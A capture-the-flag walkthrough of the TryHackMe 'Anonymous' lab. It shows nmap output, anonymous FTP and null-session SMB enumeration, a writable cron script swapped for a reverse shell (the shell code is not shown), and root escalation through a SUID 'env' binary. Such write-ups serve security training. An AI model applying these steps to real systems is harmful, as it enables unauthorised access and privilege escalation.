# [Anonymous](https://tryhackme.com/room/anonymous)

First as usual, `nmap`

```
# Nmap 7.92 scan initiated Fri Sep 24 15:05:52 2021 as: nmap -vvv -p 21,22,139,445 -sCV -oA init 10.10.241.94
Nmap scan report for box.ip (10.10.241.94)
Host is up, received conn-refused (0.22s latency).
Scanned at 2021-09-24 15:05:53 +07 for 21s

PORT    STATE SERVICE     REASON  VERSION
21/tcp  open  ftp         syn-ack vsftpd 2.0.8 or later
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.17.21.200
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCi47ePYjDctfwgAphABwT1jpPkKajXoLvf3bb/zvpvDvXwWKnm6nZuzL2HA1veSQa90ydSSpg8S+B8SLpkFycv7iSy2/Jmf7qY+8oQxWThH1fwBMIO5g/TTtRRta6IPoKaMCle8hnp5pSP5D4saCpSW3E5rKd8qj3oAj6S8TWgE9cBNJbMRtVu1+sKjUy/7ymikcPGAjRSSaFDroF9fmGDQtd61oU5waKqurhZpre70UfOkZGWt6954rwbXthTeEjf+4J5+gIPDLcKzVO7BxkuJgTqk4lE9ZU/5INBXGpgI5r4mZknbEPJKS47XaOvkqm9QWveoOSQgkqdhIPjnhD
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPjHnAlR7sBuoSM2X5sATLllsFrcUNpTS87qXzhMD99aGGzyOlnWmjHGNmm34cWSzOohxhoK2fv9NWwcIQ5A/ng=
|   256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDHIuFL9AdcmaAIY7u+aJil1covB44FA632BSQ7sUqap
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 10656/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 37572/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 56570/udp): CLEAN (Failed to receive data)
|   Check 4 (port 62665/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ANONYMOUS<00>        Flags: <unique><active>
|   ANONYMOUS<03>        Flags: <unique><active>
|   ANONYMOUS<20>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-time:
|   date: 2021-09-24T08:06:06
|_  start_date: N/A
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2021-09-24T08:06:06+00:00

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 24 15:06:14 2021 -- 1 IP address (1 host up) scanned in 22.11 seconds
```

We have FTP, SSH, and SMB. We can log into FTP anonymously. We have a few files to download.

```
ftp> cd scripts
250 Directory successfully changed.

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1419 Sep 24 08:12 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.

ftp> mget clean.sh removed_files.log to_do.txt
```

Of those files, `removed_files.log` and `to_do.txt` don't give us anything new and helpful but `clean.sh` is a script.

```sh
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

We see that the script just either deletes some files or append to `removed_files.log`. Looking back at `removed_files.log`, we see that the script is being run periodically, likely as a cron job. We can also write the file in `ftp` so we create a reverse shell, upload it, and set up a listener to catch the shell. After some time, we should have a shell as "namelessone". I then added my own SSH to get a nice SSH shell.

We had SMB so we try anonymous/null authentication on it.

```sh
$ cme smb box.ip -u "" -p "" --shares
SMB         10.10.241.94    445    ANONYMOUS        [*] Windows 6.1 (name:ANONYMOUS) (domain:) (signing:False) (SMBv1:True)
SMB         10.10.241.94    445    ANONYMOUS        [+] \:
SMB         10.10.241.94    445    ANONYMOUS        [+] Enumerated shares
SMB         10.10.241.94    445    ANONYMOUS        Share           Permissions     Remark
SMB         10.10.241.94    445    ANONYMOUS        -----           -----------     ------
SMB         10.10.241.94    445    ANONYMOUS        print$                          Printer Drivers
SMB         10.10.241.94    445    ANONYMOUS        pics            READ            My SMB Share Directory for Pics
SMB         10.10.241.94    445    ANONYMOUS        IPC$                            IPC Service (anonymous server (Samba, Ubuntu))
```

We see that we have the `pics` share. We can enumerate it anonymously.

```sh
$ smbclient -U ''%'' //box.ip/pics

smb: \> ls
  .                                   D        0  Sun May 17 18:11:34 2020
  ..                                  D        0  Thu May 14 08:59:10 2020
  corgo2.jpg                          N    42663  Tue May 12 07:43:42 2020
  puppos.jpeg                         N   265188  Tue May 12 07:43:42 2020

smb: \> mget *
```

We download the 2 files in the share. I tried some stegonography on them but to no avail.

Going back to our shell. Checking our groups ...

```sh
namelessone@anonymous:~$ id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

We see that we're in the `lxd` group. We can use this for privilege escalation. However, there's an easier way. Looking for SUID executables ...

```sh
namelessone@anonymous:~$ find / -perm -4000 2>/dev/null
/usr/bin/env
[snip]
```

We have `env` with SUID. Following [GTFObins](https://gtfobins.github.io/gtfobins/env/#suid), we can get a root shell simply with `env /bin/bash -p`.
